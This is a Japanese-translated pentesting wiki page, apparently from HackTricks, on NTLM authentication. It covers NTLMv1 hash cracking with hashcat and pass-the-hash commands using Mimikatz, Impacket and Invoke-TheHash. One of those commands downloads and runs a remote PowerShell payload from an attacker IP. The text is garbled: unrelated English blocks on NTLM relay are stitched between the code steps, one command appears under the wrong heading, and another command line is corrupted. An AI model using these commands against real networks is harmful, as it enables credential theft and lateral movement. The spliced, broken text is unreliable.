# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセス**したいですか、または**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングトリックを共有するために** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>

## 基本情報

**NTLM資格情報**: ドメイン名（あれば）、ユーザー名、パスワードハッシュ。

**LM**は**Windows XPおよびサーバー2003**でのみ**有効**です（LMハッシュはクラック可能）。LMハッシュAAD3B435B51404EEAAD3B435B51404EEは、LMが使用されていないことを意味します（空の文字列のLMハッシュです）。

デフォルトでは**Kerberos**が**使用**されるため、NTLMは**Active Directoryが構成されていない**、**ドメインが存在しない**、**Kerberosが機能していない**（構成が不良）、または**クライアント**が有効なホスト名の代わりにIPを使用して接続しようとする場合にのみ使用されます。

**NTLM認証**の**ネットワークパケット**にはヘッダー "**NTLMSSP**" があります。

プロトコル：LM、NTLMv1、およびNTLMv2は、DLL %windir%\Windows\System32\msv1\_0.dll でサポートされています。

## LM、NTLMv1およびNTLMv2

使用されるプロトコルを確認および設定できます：

### GUI

_secpol.msc_を実行 -> ローカルポリシー -> セキュリティオプション -> ネットワークセキュリティ：LANマネージャー認証レベル。 レベルは6つあります（0から5まで）。

![](<../../.gitbook/assets/image (92).png>)

### レジストリ

これにより、レベル5が設定されます：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能な値:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 基本的なNTLMドメイン認証スキーム

1. **ユーザー**が**資格情報**を入力します
2. クライアントマシンが**認証リクエストを送信**し、**ドメイン名**と**ユーザー名**を送信します
3. **サーバー**が**チャレンジ**を送信します
4. **クライアント**は**パスワードのハッシュを使用**して**チャレンジを暗号化**し、応答として送信します
5. **サーバー**が**ドメインコントローラー**に**ドメイン名、ユーザー名、チャレンジ、応答**を送信します。Active Directoryが構成されていない場合や、ドメイン名がサーバー名の場合、資格情報は**ローカルで確認**されます。
6. **ドメインコントローラー**がすべてが正しいかどうかを確認し、情報をサーバーに送信します

**サーバー**と**ドメインコントローラー**は、**NTDS.DIT**データベース内にサーバーのパスワードがあるため、**Netlogon**サーバーを介して**セキュアチャネル**を作成できます。

### ローカルNTLM認証スキーム

認証は**以前に述べたものと同じ**ですが、**サーバー**は**SAM**ファイル内で認証しようとする**ユーザーのハッシュを知っています**。したがって、ドメインコントローラーに問い合わせる代わりに、**サーバー自体がユーザーの認証を確認**します。

### NTLMv1チャレンジ

**チャレンジの長さは8バイト**で、**応答は24バイト**です。

**NTハッシュ（16バイト）**は**7バイトずつ3つの部分**に分かれます（7B + 7B +（2B + 0x00\*5））：**最後の部分はゼロで埋められます**。その後、**各部分ごとにチャレンジが別々に暗号化**され、**結果の**暗号化されたバイトが**結合**されます。合計：8B + 8B + 8B = 24バイト。

**問題点**：

- **ランダム性の欠如**
- 3つの部分は**個別に攻撃**され、NTハッシュが見つかる可能性があります
- **DESは破られやすい**
- 3番目のキーは常に**5つのゼロ**で構成されています。
- 同じチャレンジが与えられると、**応答**は**同じ**になります。したがって、被害者に対して文字列「**1122334455667788**」を**チャレンジ**として与え、**事前計算されたレインボーテーブル**を使用して使用された応答を攻撃できます。

### NTLMv1攻撃

最近では、無制限委任が構成された環境を見つけることが少なくなっていますが、これは**悪用できないことを意味しない**ことに注意してください。

ADで既に持っている一部の資格情報/セッションを悪用して、プリントスプーラーサービスを構成して**ホストを操作下に認証**させることができます。その後、`metasploit auxiliary/server/capture/smb`または`responder`を使用して、**認証チャレンジを1122334455667788**に設定し、認証試行をキャプチャし、それが**NTLMv1**を使用して行われた場合、**破る**ことができます。\
`responder`を使用している場合は、**認証をダウングレード**しようとして、**フラグ`--lm`**を使用してみることができます。\
_このテクニックでは、認証はNTLMv1を使用して実行する必要があることに注意してください（NTLMv2は有効ではありません）。_

プリンターは認証中にコンピューターアカウントを使用し、コンピューターアカウントは**長くランダムなパスワード**を使用していますが、一般的な**辞書**を使用して**破ることはできない**可能性があります。しかし、**NTLMv1**認証は**DESを使用**しています（[詳細はこちら](./#ntlmv1-challenge)）、そのため、DESを破るために特に専用のサービスを使用することで、それを破ることができます（たとえば、[https://crack.sh/](https://crack.sh)を使用できます）。

### hashcatを使用したNTLMv1攻撃

NTLMv1はNTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)を使用して、hashcatで破ることができる形式でNTLMv1メッセージをフォーマットできます。

コマンド
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM Relay Attack

### Introduction

NTLM relay attacks are a common technique used by attackers to escalate privileges in a Windows environment. This attack involves intercepting NTLM authentication traffic and relaying it to a target server to gain unauthorized access.

### How it Works

1. The attacker intercepts NTLM authentication traffic between a client and a server.
2. The attacker relays this traffic to another server, tricking it into believing the attacker is the legitimate user.
3. The attacker can then execute commands on the target server with the privileges of the compromised user.

### Mitigation

To mitigate NTLM relay attacks, consider implementing the following measures:

- **Enforce SMB Signing:** Require SMB signing to prevent tampering with authentication traffic.
- **Enable LDAP Signing:** Enable LDAP signing to protect against relay attacks on LDAP traffic.
- **Use Extended Protection for Authentication:** This helps protect against NTLM relay attacks by requiring channel binding tokens.

By implementing these measures, you can significantly reduce the risk of falling victim to NTLM relay attacks.
```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Relaying

## Introduction

NTLM relaying is a common technique used by attackers to escalate privileges in a Windows environment. This attack involves intercepting an NTLM authentication request and relaying it to another machine, tricking the target into authenticating against a malicious server.

## How it Works

1. The attacker intercepts an NTLM authentication request from a victim machine.
2. The attacker relays the authentication request to a different machine on the network.
3. The malicious server on the network then forwards the authentication request to a target server.
4. The target server responds to the authentication request, thinking it is coming from the victim machine.
5. The attacker gains access to the target server using the victim's credentials.

## Mitigation

To prevent NTLM relaying attacks, consider implementing the following measures:

- Disable NTLM authentication in favor of more secure protocols like Kerberos.
- Enable SMB signing to prevent tampering with SMB traffic.
- Implement Extended Protection for Authentication to protect against relaying attacks.
- Use Group Policy to restrict NTLM usage in the network.

By implementing these measures, you can significantly reduce the risk of NTLM relaying attacks in your Windows environment.
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
実行するhashcat（分散はhashtopolisなどのツールを介して最適です）これにはそれ以外に数日かかります。
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
この場合、パスワードが「password」であることがわかっているので、デモ目的で不正行為を行います。
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
次に、hashcatユーティリティを使用して、クラックされたDESキーをNTLMハッシュの一部に変換する必要があります：
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
## NTLM

### Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used for single sign-on and is the default authentication protocol in Windows environments.

### Weaknesses

NTLM has several weaknesses that make it vulnerable to attacks, including:

- **Pass-the-Hash**: Attackers can use the hash of a user's password to authenticate as that user without knowing the actual password.
- **Pass-the-Ticket**: Attackers can use stolen ticket-granting tickets to authenticate to services as a legitimate user.
- **Relay Attacks**: Attackers can relay authentication attempts to other services, allowing them to impersonate users.

### Mitigations

To mitigate the weaknesses of NTLM, consider the following measures:

- **Disable NTLM**: Whenever possible, disable NTLM in favor of more secure authentication protocols like Kerberos.
- **Enforce SMB Signing**: Require SMB signing to protect against man-in-the-middle attacks.
- **Enable LDAP Signing**: Enable LDAP signing to prevent man-in-the-middle attacks on LDAP traffic.
- **Use Extended Protection for Authentication**: Enable Extended Protection for Authentication to protect against NTLM relay attacks.

By understanding the weaknesses of NTLM and implementing these mitigations, you can improve the security of your Windows environment.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM Relay Attack

### Overview

NTLM relay attacks are a common technique used by attackers to exploit the NTLM authentication protocol. By intercepting and relaying NTLM authentication messages, an attacker can impersonate a legitimate user and gain unauthorized access to resources on a network.

### How it works

1. The attacker intercepts an NTLM authentication request from a victim machine to a server.
2. The attacker relays the authentication request to another server on the network.
3. The second server responds to the authentication request, believing it is coming from the victim machine.
4. If successful, the attacker can access resources on the second server using the victim's credentials.

### Mitigation

To protect against NTLM relay attacks, consider implementing the following measures:

- Disable NTLM authentication in favor of more secure protocols like Kerberos.
- Enable SMB signing to prevent tampering with authentication messages.
- Implement Extended Protection for Authentication to prevent relay attacks.
- Use strong, unique passwords to make credential theft more difficult for attackers.

By taking these steps, you can help secure your network against NTLM relay attacks and protect sensitive information from unauthorized access.
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 チャレンジ

**チャレンジの長さは 8 バイト**であり、**2 つのレスポンスが送信されます**：1 つは**24 バイト**で、**もう 1 つ**の長さは**可変**です。

**最初のレスポンス**は、**クライアントとドメイン**から構成される**文字列**を使用して**HMAC\_MD5**を使って暗号化し、**NT ハッシュ**の**MD4 ハッシュ**を**キー**として使用します。その後、**結果**は**チャレンジ**を暗号化するための**キー**として使用されます。これに**8 バイトのクライアント チャレンジ**が追加されます。合計：24 B。

**2 番目のレスポンス**は、**複数の値**（新しいクライアント チャレンジ、**リプレイ攻撃**を回避するための**タイムスタンプ**など）を使用して作成されます。

**成功した認証プロセスをキャプチャした pcap ファイル**がある場合、このガイドに従ってドメイン、ユーザー名、チャレンジ、レスポンスを取得し、パスワードを解読してみることができます：[https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## パス・ザ・ハッシュ

**被害者のハッシュを取得したら**、それを**偽装**することができます。\
その**ハッシュを使用して NTLM 認証を実行するツール**を使用する必要があります。**または**、新しい**セッションログオン**を作成し、その**ハッシュ**を**LSASS**に**インジェクト**することができます。そのため、**NTLM 認証が実行されるときにそのハッシュが使用されます。** 最後のオプションは mimikatz が行うことです。

**パス・ザ・ハッシュ攻撃はコンピュータ アカウントを使用しても実行できることを覚えておいてください。**

### **Mimikatz**

**管理者として実行する必要があります**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
これにより、mimikatzを起動したユーザーに属するプロセスが開始されますが、LSASS内部では、保存された資格情報はmimikatzパラメータ内にあります。その後、そのユーザーであるかのようにネットワークリソースにアクセスできます（`runas /netonly`トリックに類似していますが、平文パスワードを知る必要はありません）。

### LinuxからのPass-the-Hash

LinuxからPass-the-Hashを使用してWindowsマシンでコード実行を取得できます。\
[**こちらをクリックして方法を学んでください。**](../../windows/ntlm/broken-reference/)

### Impacket Windowsコンパイル済みツール

Windows用のimpacketバイナリを[こちらからダウンロードできます](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe**（この場合、コマンドを指定する必要があります。cmd.exeとpowershell.exeは対話型シェルを取得するために有効ではありません）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* 他にもいくつかのImpacketバイナリがあります...

### Invoke-TheHash

こちらからpowershellスクリプトを入手できます: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

#### Invoke-WMIExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

#### Invoke-SMBClient
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

#### Invoke-SMBEnum
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

この機能は**他のすべての機能を組み合わせたもの**です。**複数のホスト**を渡すことができ、**除外**することもでき、使用したい**オプション**を**選択**できます（_SMBExec、WMIExec、SMBClient、SMBEnum_）。**SMBExec**と**WMIExec**のいずれかを選択した場合でも、_**Command**_ パラメータを指定しない場合は、単に**十分な権限**があるかどうかを**チェック**します。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM パス・ザ・ハッシュ](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**管理者として実行する必要があります**

このツールはmimikatzと同じことを行います（LSASSメモリを変更します）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### ユーザー名とパスワードを使用した手動のWindowsリモート実行

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Windowsホストからの資格情報の抽出

**Windowsホストから資格情報を取得する方法についての詳細は、[このページ](broken-reference)を読んでください。**

## NTLMリレーとレスポンダー

**これらの攻撃を実行する方法の詳細なガイドについては、[こちら](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)を読んでください。**

## ネットワークキャプチャからNTLMチャレンジを解析する

**[https://github.com/mlgualtieri/NTLMRawUnHide](https://github.com/mlgualtieri/NTLMRawUnHide)を使用できます。**
